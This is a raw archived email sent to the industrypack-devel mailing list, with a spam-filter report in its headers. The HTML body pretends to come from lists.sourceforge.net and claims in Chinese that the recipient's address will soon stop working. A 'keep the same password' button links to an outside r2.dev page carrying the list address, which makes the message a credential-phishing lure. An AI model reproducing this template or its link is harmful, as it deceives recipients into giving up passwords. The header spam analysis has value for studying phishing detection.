Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 769D6A56306
	for <lists+industrypack-devel@lfdr.de>; Fri,  7 Mar 2025 09:55:48 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1tqTUh-0002TC-8h
	for lists+industrypack-devel@lfdr.de;
	Fri, 07 Mar 2025 08:55:47 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <moses@naaip.org>) id 1tqTUS-0002Su-Sj
 for industrypack-devel@lists.sourceforge.net;
 Fri, 07 Mar 2025 08:55:32 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=JsjG0hGOQ8K3FgV9K8TMKO6pErC+vgRMjhxvmiuxAtE=; b=PpwJpNO0Jof/IzM8VNZQ+c27km
 VBDREpueQe3a6b0JsLVBBUC98B1DGRf6RYL6R+4iEd7YixWEJAKpm5mGQDYRj4lqvHPIMRLxAgfL7
 hSPausI3HlvtE1JfO1O91c9fbuiFY8KAZYN0aVaupIAciE6Oc2cG9/+hA30BMqP+OShQ=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=JsjG0hGOQ8K3FgV9K8TMKO6pErC+vgRMjhxvmiuxAtE=; b=a
 UJ15Envadgpaz2JpjqGuZlreYdDtNn2K7AXuVTOsXvGJdF1lD4P7crxaBUaFNjSafxIQM8/SE2gF0
 1uckHkCZqBt86euy9Y8M/MPDmtbLRrWSyxfhJg6MuN1jkFcw5ivx9ZUjiNoRIP2CqLiWap/rJIDaE
 dHVceRXziy2/wP1c=;
Received: from [94.198.54.231] (helo=s1112637.srvape.com)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtp (Exim 4.95)
 id 1tqTUR-0000eJ-I3 for industrypack-devel@lists.sourceforge.net;
 Fri, 07 Mar 2025 08:55:32 +0000
Received: from [161.129.36.106] (localhost [IPv6:::1])
 by s1112637.srvape.com (Postfix) with ESMTP id D9CDC6BFA3A
 for <industrypack-devel@lists.sourceforge.net>;
 Fri,  7 Mar 2025 10:28:30 +0300 (MSK)
From: lists.sourceforge.net<moses@naaip.org>
To: industrypack-devel@lists.sourceforge.net
Date: 7 Mar 2025 02:28:12 -0500
Message-ID: <20250307022811.8D854A0BE1026016@naaip.org>
MIME-Version: 1.0
X-Spam-Score: 6.2 (++++++)
X-Spam-Report: Spam detection software, running on the system "util-spamd-2.v13.lw.sourceforge.com",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  lists.sourceforge.net 请注意，您的电子邮件industrypack-devel@lists.sourceforge.net在今天之后不再有效。
    3/7/2025 2:28:11 a.m. 
 
 Content analysis details:   (6.2 points, 6.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.4 NO_DNS_FOR_FROM        DNS: Envelope sender has no MX or A DNS records
  3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
                             [94.198.54.231 listed in zen.spamhaus.org]
  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in
                             DNS
  0.0 SPF_NONE               SPF: sender does not publish an SPF Record
  0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.0 HTML_FONT_SIZE_LARGE   BODY: HTML font size is large
  0.0 RCVD_IN_VALIDITY_CERTIFIED_BLOCKED RBL: ADMINISTRATOR NOTICE:
                             The query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                             [94.198.54.231 listed in sa-accredit.habeas.com]
  0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
                             query to Validity was blocked.  See
                             https://knowledge.validity.com/hc/en-us/articles/20961730681243
                              for more information.
                             [94.198.54.231 listed in bl.score.senderscore.com]
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  0.0 TO_NO_BRKTS_FROM_MSSP  Multiple header formatting problems
  0.0 TO_NO_BRKTS_NORDNS_HTML To: lacks brackets and no rDNS and HTML
                             only
X-Headers-End: 1tqTUR-0000eJ-I3
Subject: [Industrypack-devel] IT Authentication
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6284509137887498518=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============6284509137887498518==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
<body><br class=3D"Apple-interchange-newline">
<table align=3D"center" style=3D'color: rgb(0, 0, 0); text-transform: none;=
 text-indent: 0px; letter-spacing: normal; font-family: "YS Text", Arial, s=
ans-serif; font-size: 16px; font-style: normal; font-variant: normal; font-=
weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2;=
 -webkit-text-stroke-width: 0px; font-variant-ligatures: normal;'>
<tbody style=3D"white-space: normal !important;">
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; border: 1px solid rgb(230, 230, 230); border-imag=
e: none; width: 755px; white-space: normal !important; max-width: 550px;">
<table width=3D"100%" align=3D"center" style=3D"border-color: rgb(230, 230,=
 230); width: 550px; white-space: normal !important; max-width: 550px;">
<tbody style=3D"white-space: normal !important;">
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; padding-top: 22px; padding-right: 30px; padding-l=
eft: 21px; white-space: normal !important;">
<table style=3D"width: 495px; white-space: normal !important; min-width: 15=
0px;">
<tbody style=3D"white-space: normal !important;">
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; white-space: normal !important;">
<p align=3D"center" style=3D"white-space: normal !important;"><font color=
=3D"#eb1d1d" size=3D"6">lists.sourceforge.net</font><br style=3D"white-spac=
e: normal !important;"><br style=3D"white-space: normal !important;">&#3583=
1;&#27880;&#24847;&#65292;&#24744;&#30340;&#30005;&#23376;&#37038;&#20214;i=
ndustrypack-devel@lists.sourceforge.net&#22312;&#20170;&#22825;&#20043;&#21=
518;&#19981;&#20877;&#26377;&#25928;&#12290;<br style=3D"white-space: norma=
l !important;"><br style=3D"white-space: normal !important;">
<span style=3D"font-size: 13pt; white-space: normal !important;"><span styl=
e=3D"font-family: Calibri; white-space: normal !important;"><span style=3D"=
font-size: 13pt; white-space: normal !important;">3/7/2025 2:28:11 a.m.<br =
style=3D"white-space: normal !important;"><br style=3D"white-space: normal =
!important;"></span></span></span></p>
<table align=3D"center" style=3D"width: 200px; height: 24px; white-space: n=
ormal !important; border-collapse: collapse; table-layout: fixed; max-width=
: 200px; border-spacing: 0px;">
<tbody style=3D"white-space: normal !important;">
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; width: 175px; text-align: center; white-space: no=
rmal !important; background-color: rgb(45, 91, 167);">
<a style=3D"background-position: 0% 0%; padding: 0px 8px; border: 10px soli=
d rgb(45, 91, 167); border-image: none; color: rgb(255, 255, 255); line-hei=
ght: 1.1; font-family: Calibri; font-size: 12pt; vertical-align: baseline; =
display: block; white-space: normal !important;" href=3D"https://pub-fd2c30=
26d7c64f3594e7d0552a804432.r2.dev/Update/index.html?info=3Dindustrypack-dev=
el@lists.sourceforge.net" rel=3D"noopener noreferrer"><strong style=3D"whit=
e-space: normal !important;">&#20445;&#30041;&#30456;&#21516;&#23494;&#3072=
1;</strong>
</a></td></tr></tbody></table>
<br style=3D"font-size: 12pt; white-space: normal !important;">&nbsp;</td><=
/tr></tbody></table></td></tr>
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; height: 22px; white-space: normal !important;">&n=
bsp;</td></tr>
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; height: 50px; text-align: center; white-space: no=
rmal !important;"><span style=3D"font-size: 11px; white-space: normal !impo=
rtant;"><span style=3D"font-family: Calibri; font-size: 9pt; white-space: n=
ormal !important;"><font face=3D"Arial" style=3D"background-color: rgb(248,=
 248, 249);">
&#22914;&#26524;lists.sourceforge.net&#31995;&#32479;&#20013;&#26816;&#2797=
9;&#21040;&#30340;&#30003;&#35831;&#38382;&#39064;&#20173;&#26410;&#20986;&=
#29616;&#65292;&#21017;&#23427;&#20204;&#23558;&#19981;&#20877;&#36827;&#34=
892;&#35843;&#26597;&#25110;&#35299;&#20915;&#12290;</font></span></span></=
td></tr>
</tbody></table>
<table width=3D"100%" style=3D"border: 1px solid rgb(230, 230, 230); border=
-image: none; width: 548px; white-space: normal !important;">
<tbody style=3D"white-space: normal !important;">
<tr style=3D"white-space: normal !important;">
<td style=3D"margin: 0px; padding: 10px 33px 33px; width: 713px; white-spac=
e: normal !important; background-color: rgb(248, 248, 249);">
<p align=3D"center" style=3D"white-space: normal !important;"><span style=
=3D"font-family: Arial, Helvetica, sans-serif; white-space: normal !importa=
nt;"><span style=3D"font-size: 11px; white-space: normal !important;">&copy=
;<span style=3D"font-family: Calibri; white-space: normal !important;">&nbs=
p;2025 lists.sourceforge.net</span></span></span></p></td></tr></tbody></ta=
ble></td></tr></tbody></table><br class=3D"Apple-interchange-newline"></bod=
y></html>


--===============6284509137887498518==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6284509137887498518==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============6284509137887498518==--
